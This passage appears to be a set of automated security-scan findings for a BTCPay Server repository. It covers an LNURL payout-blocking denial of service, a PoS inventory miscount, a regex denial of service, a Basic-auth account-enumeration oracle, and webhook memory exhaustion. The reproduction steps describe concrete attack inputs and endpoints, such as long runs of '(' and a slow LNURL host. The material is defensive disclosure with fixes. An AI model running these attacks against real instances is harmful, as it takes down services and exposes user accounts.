9. [BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs:426–475](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs#L426-L475)
   POST /api/v1/pull-payments/{id}/payouts is likewise [AllowAnonymous] and unrate-limited, giving a scriptable claim path with destination and amount under the attacker's control.

## Impact
Complete, sustained and deterministic loss of availability of the pull payment / payout component for every store on the instance: claims, LNURL-withdraw callbacks, merchant approvals and cancellations, MarkPaid from the Lightning and on-chain payout processors and the pending-payout listener, and on-chain payout confirmation tracking all block for as long as the attacker keeps sending one claim per minute. The rest of the web application keeps serving. No confidentiality or integrity effect.

## Reproduction steps
1. Anonymous network attacker who holds the id of any live pull payment with a Lightning payout method and AutoApproveClaims (e.g. a refund link given to a customer), or a self-registered user who creates one in their own store with an arbitrary external LN connection string. They host a public HTTP server that answers the controller's pre-validation LNURL fetch instantly with a valid payRequest and answers the two in-actor fetches just under 30 s each (with a huge MinSendable so the payout is cancelled and the limit is untouched), and POST a claim with destination `x@their-host` about once per minute. Each claim holds PullPaymentHostedService.Loop ~60 s, so the payout subsystem for all stores stays blocked. No credentials, no user interaction, no rate limit on the claim endpoints, no dedup (LNURLPayClaimDestinaton.Id is null). Attack requirements PRESENT: an LN-enabled auto-approve pull payment must exist and its id be known or self-provisioned.

## Recommended fix
1. HandleApproval, and the inline auto-approve path in HandleCreatePayout, perform payee-controlled outbound LNURL fetches (and the store's rate fetch) synchronously inside the single-threaded PullPaymentHostedService actor loop, so one slow remote host serialises all payout operations for every store. Fix criteria: No remote I/O whose latency is controlled by an untrusted party executes on the actor's critical path: the destination's parsed form and minimum payout amount (and the rate) are resolved before the request is enqueued — the controller has already parsed the destination once — or in a bounded, parallel pre-stage, and only results are handed to the actor. Verify that a claim or approval against an LNURL host that answers slowly or never does not delay unrelated claims, approvals or MarkPaid calls from other stores.
2. Anonymous claim endpoints accept unlimited repeated LNURL/Lightning-address claims against the same pull payment because LNURL destinations carry no DedupId and no rate limit applies. Fix criteria: Repeated claims from one source against one pull payment are bounded (rate limit on the anonymous claim endpoints or per-destination dedup for pending/recently-cancelled LNURL payouts), so a single payee cannot keep the payout pipeline continuously occupied.

---
**Severity:** HIGH
**Status:** Open
**Category:** Denial of service
**CWE:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257430

---

# PoS inventory decremented by one unit regardless of quantity for single-item orders

## Details
PoS inventory is enforced in two places: the anonymous POST handler rejects a cart line whose requested quantity exceeds the item's current inventory (UIPointOfSaleController.cs:302-304, "Inventory for {0} exhausted"), and `AppInventoryUpdaterHostedService` applies the change when the invoice is Created (delta -count) and reverses it on Expired/MarkedInvalid (delta +count).

The decrement ignores the purchased quantity whenever the invoice carries an `ItemCode`. The controller sets `ItemCode = selectedChoices is [{} c1] ? c1.Id : null` (UIPointOfSaleController.cs:401); `selectedChoices` receives one entry per cart line (line 305), so ItemCode is set for any cart with exactly one line, including a Cart-view line with `count` > 1 (Cart.cshtml:132 exposes a quantity input bounded only by `:max=item.inventory`, and common.js `posdata()` serialises the cart with its counts into the hidden `posData` field). In the hosted service the condition is

```
if (!string.IsNullOrEmpty(ItemCode) || AppService.TryParsePosCartItems(PosData, out cartItems))
```

(AppInventoryUpdaterHostedService.cs:47-48). Because `||` short-circuits, `Metadata.PosData.cart` is never parsed when ItemCode is set; `cartItems` stays null and the only change applied is `new AppCartItem { Id = ItemCode, Count = 1 }` (lines 52-61), so `UpdateInventory` (AppService.cs:404-450) subtracts exactly 1 from the template's `inventory`. The order itself is built with `cartItem.Count` (line 313) and the invoice is priced for N units.

Net effect: an anonymous buyer who orders N units of a single item (N <= displayed inventory) receives an invoice for N units while the merchant's stock counter drops by 1. Repeating this oversells the limited stock far beyond the cap the server is meant to enforce (inventory 5: buy 5 -> 4 left, buy 4 -> 3 left, ... 15 units sold against a cap of 5). Ordinary honest buyers trigger the same under-count, so the inventory control is unreliable in general. `TryParsePosCartItems` (AppService.cs:495-523) carries per-item counts and the Playwright test at POSTests.cs:617-621 asserts a 2-unit purchase reduces stock by 2, showing count-based accounting is the intended behaviour; that test's cart has several distinct lines, so ItemCode is null and the single-line branch is never exercised.

Expiry is symmetric on this path (1 deducted, 1 restored), so there is no downward drift; the defect is the under-decrement on creation.

The LNURL path (UILNURLController.cs:346) and the Static view's `choiceKey` (line 266) always create single-unit orders, so they are unaffected; the Cart view and the keypad product list are the affected entry points.

## Evidence
1. [BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs:47–63](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs#L47-L63)
   Short-circuit `||` skips TryParsePosCartItems whenever ItemCode is set; cartItems stays null and a single AppCartItem with hard-coded Count = 1 becomes the only InventoryChange, regardless of the cart line's count.
2. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:401](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L401)
   ItemCode is set whenever selectedChoices has exactly one element, i.e. whenever the cart has exactly one line, independent of that line's count.
3. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:297–313](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L297-L313)
   The shipped control: the payer's requested quantity is checked against inventory (302-304) and the order line is built with cartItem.Count (313), so N units are sold while the hosted service deducts 1.
4. [BTCPayServer/Plugins/PointOfSale/Views/Public/Cart.cshtml:132](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Views/Public/Cart.cshtml#L132)
   The Cart view lets a payer set a per-line quantity (v-model item.count, max = inventory); common.js posdata() serialises the cart with counts into the posted posData, so a one-line cart with count > 1 is ordinary use.
5. [BTCPayServer/Services/Apps/AppService.cs:495–523](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L495-L523)
   TryParsePosCartItems carries the per-item Count that the hosted service never reaches on the ItemCode path.
6. [BTCPayServer.Tests/POSTests.cs:617–621](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/POSTests.cs#L617-L621)
   Maintainers expect count-based decrement (2 units bought -> 5 left becomes 3); the test cart has several distinct lines so ItemCode is null and the single-line branch is not exercised.

## Impact
Integrity of the merchant's inventory accounting is lost: limited items can be oversold and stock counters become wrong; no confidentiality or availability impact on the service itself.

## Reproduction steps
1. Anonymous buyer on the public PoS (Cart view or keypad with product list) adds N units of one item with N not exceeding the shown inventory and submits. The server accepts (quantity check passes), creates an invoice for N units, and the inventory updater deducts only 1. No special conditions or timing are required; repeat to exhaust real stock while displayed inventory remains positive.

## Recommended fix
The inventory updater treats ItemCode and PosData.cart as mutually exclusive and uses a hard-coded quantity of 1 for the ItemCode path, while the PoS sets ItemCode for single-line carts of any quantity. Fix criteria: Inventory changes must reflect the actual purchased quantity for every PoS invoice shape (choiceKey, single-line cart with count > 1, multi-line cart), and the same quantities must be restored on expiry/invalidation. Verify with a test that buys N > 1 units of one item in the Cart view and asserts inventory decreases by N, and that an expired N-unit invoice restores N.

---
**Severity:** HIGH
**Status:** Open
**Category:** Incorrect calculation
**CWE:** [CWE-682](https://cwe.mitre.org/data/definitions/682.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257290

---

# Quadratic regex scan on attacker-supplied derivation scheme / wallet file content (ReDoS)

## Details
Every path that accepts a derivation scheme or wallet export from a store user first runs the regular expression `\(.*?\)` over the complete input to decide whether it looks like an output descriptor: `DerivationSchemeParser.MaybeOD` (BTCPayServer/DerivationSchemeParser.cs:40, used by `Extensions.TryParseXpub` at Extensions.cs:158, hence by `BitcoinLikePaymentHandler.ValidatePaymentMethodConfig`, by `NBXDerivGenericWalletFileParser` and again by `OutputDescriptorWalletFileParser`) and the duplicate in `UIStoreOnChainWalletsController.ParseDerivationStrategy` (line 819). The static `Regex.Match(string, string)` overload is used, i.e. the default backtracking interpreter with no match timeout; the repository sets no REGEX_DEFAULT_MATCH_TIMEOUT / AppContext regex timeout and uses no RegexOptions.NonBacktracking, and the bound view models (`DerivationSchemeViewModel.DerivationScheme`, `WalletFileContent`, `IFormFile WalletFile`; Greenfield `UpdatePaymentMethodRequest.Config`) carry no length annotation.

Mechanism: the pattern begins with the literal `(`, so the engine tries a match at every `(` in the input. At each one, `.*?` (lazy, `.` excludes only newline) is followed by a literal `)` that never appears, so the engine extends one character at a time to the end of the string before the attempt fails and the next `(` is tried. For an input of N `(` characters with no `)` and no newline the total work is Θ(N²) — set by the attacker's input length, not fixed by the code. Assumption on the framework (net10.0 System.Text.RegularExpressions interpreter): no memoisation across start positions exists for this construct, so even a vectorised inner scan leaves the N² total; with the interpreter's per-character backtracking, a 4 MB value (~8·10¹² steps) costs hours of one CPU core.

Input bounds are those of ASP.NET Core defaults or larger: the cookie UI `DerivationScheme` / `WalletFileContent` form fields are limited only by the default FormOptions.ValueLengthLimit of 4 MB (no RequestFormLimits on this controller); the multipart `WalletFile` upload is read whole by `ReadAllText` under the default 128 MB MultipartBodyLengthLimit; the Greenfield JSON `config` string is bounded only by Kestrel's MaxRequestBodySize, which PluginManager.cs:178 raises to int.MaxValue.

Entry points: (1) `PUT /api/v1/stores/{storeId}/payment-methods/BTC-CHAIN` with `{"config":"(((..."}` (Greenfield, CanModifyStoreSettings; GreenfieldStorePaymentMethodsController.cs:67-88); (2) `POST /api/v1/stores/{storeId}/payment-methods/BTC-CHAIN/wallet/preview` with the same body (only CanManageWalletSettings; GreenfieldStoreOnChainPaymentMethodsController.cs:65-88); (3) cookie UI `POST /stores/{storeId}/onchain/BTC/modify` (UIStoreOnChainWalletsController.cs:122-124) with `DerivationScheme=(((...`, `WalletFileContent=(((...`, or a `WalletFile` upload of the same content, which reaches the regex through `WalletFileParsers.TryParseWalletFile` → `NBXDerivGenericWalletFileParser` (BSMS parser ahead of it fails fast on a linear split). All three require only a store the attacker owns or manages; any self-registered user can create one. The match runs synchronously on a thread-pool thread with no cancellation, so it continues after the client disconnects, and a handful of concurrent requests from one tenant pin the CPU of the shared instance, starving checkout, payment detection and admin traffic for every other store.

This is a super-linear (quadratic) regex over unbounded attacker-chosen input — algorithmic complexity, not volumetric load: a single request of a few MB yields hours of CPU.

## Evidence
1. [BTCPayServer/DerivationSchemeParser.cs:40](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/DerivationSchemeParser.cs#L40)
   MaybeOD runs `Regex.Match(xpub, @"\(.*?\)")` (static overload: backtracking interpreter, no timeout) on the whole caller-supplied string with no length check. For N '(' characters with no ')' or newline the engine restarts at every '(' and lazily scans to end-of-input each time: Θ(N²) work set by the attacker's input length.
2. [BTCPayServer/Plugins/Wallets/Controllers/UIStoreOnChainWalletsController.cs:816–826](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIStoreOnChainWalletsController.cs#L816-L826)
   ParseDerivationStrategy duplicates the same unbounded `Regex.Match(derivationScheme, @"\(.*?\)")` (line 819) on the `DerivationScheme` form field posted to POST /stores/{storeId}/onchain/{cryptoCode}/modify (route at lines 122-124, call at line 184). The controller has no RequestFormLimits, so the default 4 MB ValueLengthLimit applies; DerivationSchemeViewModel has no MaxLength.
3. [BTCPayServer/Extensions.cs:153–169](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Extensions.cs#L153-L169)
   TryParseXpub calls DerivationSchemeParser.MaybeOD on the raw string (line 158) before any other parsing. It is reached from BitcoinLikePaymentHandler.ValidatePaymentMethodConfig with the Greenfield `config` JSON string and from the wallet-file parsers with the uploaded/pasted file content.
4. [BTCPayServer/Payments/Bitcoin/BitcoinLikePaymentHandler.cs:249–257](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/BitcoinLikePaymentHandler.cs#L249-L257)
   ValidatePaymentMethodConfig passes a string-valued Greenfield `config` straight to TryParseXpub (line 254) with no length check.
5. [BTCPayServer/Controllers/GreenField/GreenfieldStorePaymentMethodsController.cs:67–88](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldStorePaymentMethodsController.cs#L67-L88)
   PUT /api/v1/stores/{storeId}/payment-methods/{paymentMethodId} (CanModifyStoreSettings) hands request.Config to handler.ValidatePaymentMethodConfig (line 88); the JSON body's only size bound is Kestrel's MaxRequestBodySize.
6. [BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.cs:65–88](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.cs#L65-L88)
   POST .../payment-methods/{paymentMethodId}/wallet/preview requires only CanManageWalletSettings and calls handler.ValidatePaymentMethodConfig on request.Config (line 88) without persisting anything, so the regex is reachable by the narrowest wallet-settings key.
7. [BTCPayServer/Services/WalletFileParsing/NBXDerivGenericWalletFileParser.cs:6–18](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/WalletFileParsing/NBXDerivGenericWalletFileParser.cs#L6-L18)
   Second parser in DI order (BTCPayServerServices.cs:736-743, after BSMS which fails fast on a linear split); calls TryParseXpub on the entire uploaded wallet file / pasted WalletFileContent (UIStoreOnChainWalletsController.cs:154-179; ReadAllText at 785-789 reads the whole IFormFile under the default 128 MB multipart limit), so the file paths hit the same regex.
8. [BTCPayServer/Services/WalletFileParsing/OutputDescriptorWalletFileParser.cs:14](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/WalletFileParsing/OutputDescriptorWalletFileParser.cs#L14)
   Fourth parser in the chain calls MaybeOD on the same full content again once the earlier parsers fail, repeating the quadratic scan for the file-import paths.
9. [BTCPayServer/Plugins/PluginManager.cs:176–178](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager.cs#L176-L178)
   Kestrel's MaxRequestBodySize is raised globally to int.MaxValue, so a Greenfield JSON body carrying the `config` string is not limited by the usual 30 MB cap; the quadratic cost grows with the square of that length.

## Impact
No data is disclosed or altered. Availability impact is high: each request consumes a full CPU core for hours on the single BTCPay process shared by all tenants; a few concurrent requests make the instance unresponsive for every store (checkout, invoice payment detection, admin UI), and the work continues after the attacker disconnects.

## Reproduction steps
1. Attacker: a hostile tenant — any store owner or Manager (CanModifyStoreSettings on their own store, which any self-registered user can create since LockSubscription defaults false) or an API key holding only CanManageWalletSettings (wallet/preview). Delivery: one HTTP request whose derivation-scheme / config / wallet-file field is a long run of '(' — up to 4 MB as a form value, 128 MB as a multipart file, or tens of MB as a Greenfield JSON string. No length bound, no regex timeout and no cancellation exist, so the request deterministically pins a thread-pool thread for hours; repeating it a few times in parallel saturates the host. Assumes the net10.0 System.Text.RegularExpressions backtracking interpreter (framework-provided, not pinned in the repo) performs no cross-start-position memoisation for `\(.*?\)`, which matches its documented backtracking semantics. No defenses to bypass and no victim interaction.

## Recommended fix
1. MaybeOD and ParseDerivationStrategy apply an unanchored lazy-dot regex (`\(.*?\)`) to unbounded user input without a match timeout, giving quadratic worst-case time controlled by the attacker's input length. Fix criteria: Descriptor detection must run in linear time on bounded input: enforce a small maximum length (a few KB is ample for any xpub, descriptor or miniscript policy) on derivation-scheme strings, Greenfield `config` strings and wallet-file contents before parsing, and replace the regex with a linear check (e.g. IndexOf('(') followed by IndexOf(')') ordering, or RegexOptions.NonBacktracking with a match timeout) in both MaybeOD and ParseDerivationStrategy. Verify that a request carrying several MB of '(' is rejected immediately with a validation error and does not measurably raise CPU time.
2. The application sets no process-wide regex match timeout, so any backtracking regex over user input runs unbounded. Fix criteria: Configure a default regex match timeout (REGEX_DEFAULT_MATCH_TIMEOUT via AppContext) at startup so that any remaining backtracking regex over request data fails fast with RegexMatchTimeoutException instead of consuming the thread indefinitely.

---
**Severity:** HIGH
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257286

---

# Greenfield Basic auth reveals account existence, state and 2FA status before password verification

## Details
Any unauthenticated client can send `Authorization: Basic base64(email:anything)` to any Greenfield endpoint; every Greenfield controller authorizes with AuthenticationSchemes.Greenfield = "Greenfield.APIKeys,Greenfield.Basic", so BasicAuthenticationHandler runs whenever the header starts with "Basic ". HandleAuthenticateAsync looks the user up by normalized name (lines 57-60), applies the per-IP Login throttle (65-70), and then, before any password is verified, returns a different failure reason depending on the account's state:

- user does not exist: UserService.CanLogin adds 'User not found or invalid password' (UserService.cs CanLogin) and the handler fails with 'Basic authentication failed: User not found or invalid password';
- user exists but is disabled, awaiting approval, has an unconfirmed email, has no password, or fails a Monetization subscription check: the specific DefaultLoginExtension/MonetizationLoginExtension message is returned ('Your user account is currently disabled.', '...requires approval by an admin...', etc.);
- user exists in good standing but has not opted into Greenfield Basic auth (the default for every account older than 5 minutes): 'Basic authentication for the Greenfield API is not enabled for this user.' (line 79-80);
- user exists, has opted into Basic auth (or is <5 minutes old) and has any second factor (authenticator, FIDO2, LNURL-auth): 'Cannot use Basic authentication when multi-factor is enabled.' (lines 81-83);
- only otherwise is CheckPasswordSignInAsync called (line 85), whose failure yields SignInResult.ToString() ('Failed'/'Lockedout').

GreenfieldAuthenticationHandler.HandleChallengeAsync (lines 23-28) writes the stored reason verbatim into the 401 JSON body. The result is a deterministic pre-authentication oracle that tells an anonymous caller whether an arbitrary email is a registered account on this instance and its disabled/unapproved/unconfirmed state (for every account), and whether it is protected by a second factor (for accounts that enabled Basic auth). Because every pre-password branch returns before CheckPasswordSignInAsync, the probe is silent: no AccessFailed count is incremented and no lockout or notification is triggered on the victim account.

The maintainers' own anonymous flows are built to prevent exactly this: UIAccountController.Login checks the password first and returns a uniform 'Invalid login attempt.' whether or not the user exists (lines 176-206), surfacing CanLogin messages only after a correct password (RedirectLoginSuccess:489), and ForgotPassword redirects to the same confirmation page regardless of CanLogin (665-679). Registration is locked by default after the first admin (BTCPayServerOptions.cs:112 'disable-registration' defaults true → PoliciesSettings.LockSubscription = true), so the duplicate-email error of /register or POST /api/v1/users is not available to an anonymous caller on a default instance; the Basic handler is then the only anonymous path that reveals account existence, and the only path at all that reveals state and 2FA status without the password.

Impact: enumeration of merchant/admin email addresses on instances with closed registration, discovery of disabled/unapproved accounts, and identification of which Basic-enabled accounts lack 2FA, directing credential stuffing and phishing at the weakest accounts. The ZoneLimits.Login throttle (5r/min, burst 3, per RemoteIpAddress, production) slows but does not prevent this: responses are deterministic, so a candidate list can be worked through patiently or from several IPs, and RemoteIpAddress is derived from X-Forwarded-For that Startup.cs:324-332 accepts from any peer.

## Evidence
1. [BTCPayServer/Security/GreenField/BasicAuthenticationHandler.cs:57–87](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/GreenField/BasicAuthenticationHandler.cs#L57-L87)
   User lookup by normalized name (57-60), then before the password check at line 85 the handler fails with distinct messages: CanLogin failures (user null → 'User not found or invalid password'; existing user → disabled / requires approval / unconfirmed email / no password), then 'Basic authentication for the Greenfield API is not enabled for this user.' (exists, Basic auth off — the default), then 'Cannot use Basic authentication when multi-factor is enabled.' (exists, Basic auth on, 2FA on). Every one of these returns before CheckPasswordSignInAsync, so the probe also never increments the lockout counter.
2. [BTCPayServer/Security/GreenField/GreenfieldAuthenticationHandler.cs:23–28](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/GreenField/GreenfieldAuthenticationHandler.cs#L23-L28)
   HandleChallengeAsync writes the stored GreenfieldAuthFailureReason verbatim into the 401 JSON body ({"code":"unauthenticated","message":...}), so the discrepancy is returned to the unauthenticated caller.
3. [BTCPayServer/Services/UserService.cs:140–169](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UserService.cs#L140-L169)
   CanLogin returns 'User not found or invalid password' for a null user and otherwise runs the login extensions; DefaultLoginExtension produces the per-state messages (unconfirmed email, no password, requires approval, disabled) that the Basic handler surfaces pre-password.
4. [BTCPayServer.Abstractions/Constants/AuthenticationSchemes.cs:12](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Abstractions/Constants/AuthenticationSchemes.cs#L12)
   AuthenticationSchemes.Greenfield = "Greenfield.APIKeys,Greenfield.Basic": every [Authorize(AuthenticationSchemes = AuthenticationSchemes.Greenfield)] endpoint (e.g. GET /api/v1/users/me) runs the Basic handler for any request whose Authorization header starts with 'Basic '.
5. [BTCPayServer/Controllers/UIAccountController.cs:176–206](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L176-L206)
   The cookie login flow deliberately checks the password first and returns a uniform 'Invalid login attempt.' for both unknown users and wrong passwords (202-206), deferring CanLogin messages until after a correct password; the Basic handler does not follow this design, creating the oracle.
6. [BTCPayServer/Configuration/BTCPayServerOptions.cs:112](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Configuration/BTCPayServerOptions.cs#L112)
   'disable-registration' defaults to true, so after the first admin registers PoliciesSettings.LockSubscription is set (ActionLogicExtensions.FirstAdminRegistered) and the duplicate-email error of /register and anonymous POST /api/v1/users is no longer reachable; on a default instance the Basic handler is the only anonymous account-existence oracle.
7. [BTCPayServer/Hosting/Startup.cs:306](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L306)
   The Login rate zone used by the Basic handler is 5r/min burst 3 per IP in production — the only mitigation, which slows but does not prevent enumeration of a candidate list.

## Impact
Discloses which emails are registered accounts on the instance, whether they are disabled/unapproved/unconfirmed, and (for accounts that enabled Basic auth) whether they lack a second factor — limited but security-relevant confidentiality loss that targets credential stuffing and phishing. No direct integrity or availability impact.

## Reproduction steps
1. Anonymous network attacker sends GET /api/v1/users/me (or any Greenfield endpoint) with Authorization: Basic base64(candidate-email:x) and reads the 401 body. The message differs deterministically by account existence, disabled/approval/confirmation state and, for Basic-enabled accounts, 2FA status, all before any password is verified and without incrementing the victim's lockout counter. No credentials, no user interaction, default configuration (registration locked by default makes this the only anonymous existence oracle). The per-IP 5r/min throttle only slows the probe.

## Recommended fix
BasicAuthenticationHandler evaluates and reports account-state conditions (CanLogin, AllowGreenfieldBasicAuth, 2FA enabled) before verifying the password, and GreenfieldAuthenticationHandler returns the specific reason to the caller, so responses differ by account state for unauthenticated requests. Fix criteria: For unauthenticated Basic-auth attempts the 401 response must be indistinguishable across unknown user, existing user without Basic auth enabled, existing user with 2FA, and wrong password (same body and timing class), e.g. by verifying the password first (still counting lockout failures) and only then returning state-specific reasons, mirroring UIAccountController.Login. Verify by probing a non-existent email, an existing non-Basic-enabled account, and a 2FA account with a wrong password and confirming identical responses.

---
**Severity:** HIGH
**Status:** Open
**Category:** Observable Response Discrepancy
**CWE:** [CWE-204](https://cwe.mitre.org/data/definitions/204.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257285

---

# Webhook sender buffers unbounded response bodies from store-controlled endpoints into memory

## Details
WebhookSender.SendDelivery (BTCPayServer/Plugins/Webhooks/WebhookSender.cs:169) POSTs each webhook event to the store-configured URL with `httpClient.SendAsync(request, cancellationToken)` and then reads only `response.StatusCode`; the response body is never used. That overload uses HttpClient's default completion option, ResponseContentRead, so System.Net.Http downloads and buffers the entire response body in memory (HttpContent.LoadIntoBufferAsync) before SendAsync returns, bounded only by HttpClient.MaxResponseContentBufferSize. The two webhook named clients registered in WebhooksPlugin.cs:39-51 (greenfield-webhook.onion via Socks5HttpClientHandler, greenfield-webhook.clearnet via UseSSRFProtection, which only installs a ConnectCallback) leave that limit at the .NET default of int.MaxValue (2 GB) and the default 100 s timeout; the tree has no ConfigureHttpClientDefaults and the only Timeout override (BTCPayServerServices.cs:107) is scoped to the NBXplorer client.

Assumption on the .NET 10 BCL (System.Net.Http; net10.0 per Build/Common.csproj): when the response declares a Content-Length, LoadIntoBufferAsync pre-allocates a MemoryStream of that declared capacity before body bytes arrive; without Content-Length it grows a MemoryStream by doubling (peak up to ~2x the body). Either way the allocation size is dictated by the remote server's response, while the code needs zero bytes of it.

Attacker: a store owner or manager (threat-model adversary 4; registration is open by default, so any anonymous user can register and create a store they own). UIStoreWebhooksController.NewWebhook (cookie auth, Policy = CanModifyStoreSettings) and GreenfieldStoreWebhooksController.CreateWebhook (CanModifyWebhooks) accept any absolute URL (Uri.TryCreate is the only validation), and StoreRepository.CreateWebhook enforces no per-store webhook cap. The attacker points N webhooks at a public server they operate that answers every POST with a multi-hundred-MB or GB body (or a large Content-Length followed by a slow body), then fires deliveries by creating invoices in their own store or by POSTing the redeliver endpoints (UI `{storeId}/webhooks/{webhookId}/deliveries/{deliveryId}/redeliver` and Greenfield `/api/v1/stores/{storeId}/webhooks/{webhookId}/deliveries/{deliveryId}/redeliver`). WebhookProviderHostedService enqueues one delivery per webhook id into MultiProcessingQueue, whose per-key channels each get their own Process task with no global concurrency limit, so N webhooks yield N concurrent buffers. If an attempt times out (HttpCode null) or returns 5xx/408/429 and AutomaticRedelivery is on (an attacker-chosen flag), WebhookSender.Process repeats the attempt up to 8 more times over ~71 minutes with no further attacker action.

Impact: memory of the single BTCPay process, which serves every tenant's checkout, UI and Greenfield API, is exhausted: on an uncapped host the kernel OOM-killer terminates it; under a cgroup memory limit the GC hard limit raises OutOfMemoryException across the process. The webhook is persisted, so deliveries resume after restart. This is an attacker-sized allocation (the response from the attacker's endpoint sets the size, not a bound fixed by the code), not volumetric load.

The same pattern in BitpayIPNSender.SendNotification (BTCPayServer/Plugins/Bitpay/BitpayIPNSender.cs) is outside this unit and left as a lead.

## Evidence
1. [BTCPayServer/Plugins/Webhooks/WebhookSender.cs:169–180](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/WebhookSender.cs#L169-L180)
